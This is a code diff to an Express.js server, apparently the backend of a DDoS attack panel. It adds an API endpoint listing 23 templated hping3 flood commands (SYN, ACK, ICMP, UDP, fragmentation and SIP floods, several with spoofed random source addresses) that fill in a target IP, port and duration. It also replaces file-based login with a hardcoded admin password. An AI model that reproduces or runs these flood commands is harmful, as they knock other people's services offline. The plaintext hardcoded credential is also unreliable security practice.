@@ -13,48 +13,46 @@ app.use(bodyParser.json());
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(express.static('public'));
 
-// Routes
-app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
-app.get('/login', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'login.html'));
-});
-
-app.get('/dashboard', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
-});
-
 // API Routes
-app.get('/api/users', (req, res) => {
-  fs.readFile(path.join(__dirname, 'db', 'user.json'), 'utf8', (err, data) => {
-    if (err) return res.status(500).json({ error: 'Failed to read users' });
-    res.json(JSON.parse(data));
-  });
-});
-
-app.get('/api/vps', (req, res) => {
-  fs.readFile(path.join(__dirname, 'db', 'vps.json'), 'utf8', (err, data) => {
-    if (err) return res.status(500).json({ error: 'Failed to read VPS' });
-    res.json(JSON.parse(data));
+app.get('/api/config', (req, res) => {
+  res.json({
+    attackMethods: [
+      { id: 'syn_pps', name: '☠️ SYN-PPS', command: 'sudo timeout {time}s hping3 -S --flood -p {port} {ip}', desc: 'SYN Flood High Packet Rate' },
+      { id: 'syn_gbps', name: '🚀 SYN-GBPS', command: 'sudo timeout {time}s hping3 -S --flood --data 65495 -p {port} {ip}', desc: 'SYN Flood Large Packets' },
+      { id: 'ack_pps', name: '⚡ ACK-PPS', command: 'sudo timeout {time}s hping3 -A --flood -p {port} {ip}', desc: 'ACK Flood High Packet Rate' },
+      { id: 'ack_gbps', name: '🔥 ACK-GBPS', command: 'sudo timeout {time}s hping3 -A --flood --data 65495 -p {port} {ip}', desc: 'ACK Flood Large Packets' },
+      { id: 'icmp_pps', name: '🔨 ICMP-PPS', command: 'sudo timeout {time}s hping3 --icmp --flood {ip}', desc: 'ICMP Flood High Packet Rate' },
+      { id: 'icmp_gbps', name: '💣 ICMP-GBPS', command: 'sudo timeout {time}s hping3 --icmp --flood --data 65495 {ip}', desc: 'ICMP Flood Large Packets' },
+      { id: 'udp_flood', name: '🌊 UDP-FLOOD', command: 'sudo timeout {time}s hping3 --udp --flood -p {port} {ip}', desc: 'UDP Flood Attack' },
+      { id: 'tcp_flood', name: '🌪️ TCP-FLOOD', command: 'sudo timeout {time}s hping3 --tcp --flood -p {port} {ip}', desc: 'TCP Flood Attack' },
+      { id: 'mixed_syn_ack', name: '🔄 MIXED-SYN/ACK', command: 'sudo timeout {time}s hping3 -S -A --flood -p {port} {ip}', desc: 'Mixed SYN/ACK Flood' },
+      { id: 'fragment', name: '💥 FRAGMENT', command: 'sudo timeout {time}s hping3 --frag --flood -p {port} {ip}', desc: 'IP Fragmentation Attack' },
+      { id: 'rand_udp', name: '🌀 RAND-UDP', command: 'sudo timeout {time}s hping3 --udp --rand-source --flood -p {port} {ip}', desc: 'Random UDP Source Attack' },
+      { id: 'rand_syn', name: '🌪️ RAND-SYN', command: 'sudo timeout {time}s hping3 -S --rand-source --flood -p {port} {ip}', desc: 'Random SYN Source Attack' },
+      { id: 'rand_ack', name: '⚡ RAND-ACK', command: 'sudo timeout {time}s hping3 -A --rand-source --flood -p {port} {ip}', desc: 'Random ACK Source Attack' },
+      { id: 'rand_icmp', name: '🌀 RAND-ICMP', command: 'sudo timeout {time}s hping3 --icmp --rand-source --flood {ip}', desc: 'Random ICMP Source Attack' },
+      { id: 'udp_multi', name: '🎯 UDP-MULTI', command: 'sudo timeout {time}s hping3 --udp --flood -p {port} --rand-port {ip}', desc: 'Multi-Port UDP Flood' },
+      { id: 'syn_multi', name: '🌐 SYN-MULTI', command: 'sudo timeout {time}s hping3 -S --flood -p {port} --rand-port {ip}', desc: 'Multi-Port SYN Flood' },
+      { id: 'oblivion', name: '💀 OBLIVION', command: 'sudo timeout {time}s hping3 -S -A --flood --rand-source -p {port} {ip}', desc: 'Oblivion Attack (All Protocols)' },
+      { id: 'file_attack', name: '📁 FILE-ATTACK', command: 'sudo timeout {time}s hping3 -S --flood -p {port} {ip} < /dev/zero', desc: 'File-Based Attack' },
+      { id: 'ack_rmac', name: '⚡ ACK-RMAC', command: 'sudo timeout {time}s hping3 -A --flood --rand-mac -p {port} {ip}', desc: 'Random MAC ACK Flood' },
+      { id: 'syn_rand', name: '🌪️ SYN-RAND', command: 'sudo timeout {time}s hping3 -S --flood --rand-tos -p {port} {ip}', desc: 'Random TOS SYN Flood' },
+      { id: 'udp_sip', name: '📞 UDP-SIP', command: 'sudo timeout {time}s hping3 --udp --flood -p 5060 {ip}', desc: 'SIP Protocol Attack' },
+      { id: 'icmp_ts', name: '📡 ICMP-TS', command: 'sudo timeout {time}s hping3 --icmp --flood --icmp-ts {ip}', desc: 'ICMP Timestamp Flood' },
+      { id: 'rand_frpu', name: '💥 RAND-FRPU', command: 'sudo timeout {time}s hping3 --udp --flood --rand-dest -p {port} {ip}', desc: 'Random Destination Flood' }
+    ]
   });
 });
 
 app.post('/api/login', (req, res) => {
   const { username, password } = req.body;
-  fs.readFile(path.join(__dirname, 'db', 'user.json'), 'utf8', (err, data) => {
-    if (err) return res.status(500).json({ error: 'Failed to authenticate' });
-    
-    const users = JSON.parse(data);
-    const user = users.find(u => u.username === username && u.password === password);
-    
-    if (user) {
-      res.json({ success: true, user });
-    } else {
-      res.json({ success: false, message: 'Invalid credentials' });
-    }
-  });
+  
+  // Validasi login
+  if (username === 'admin' && password === 'kelvinvmxz') {
+    res.json({ success: true, user: { username: 'admin', role: 'admin' } });
+  } else {
+    res.json({ success: false, message: 'Invalid credentials' });
+  }
 });
 
 app.listen(PORT, () => {
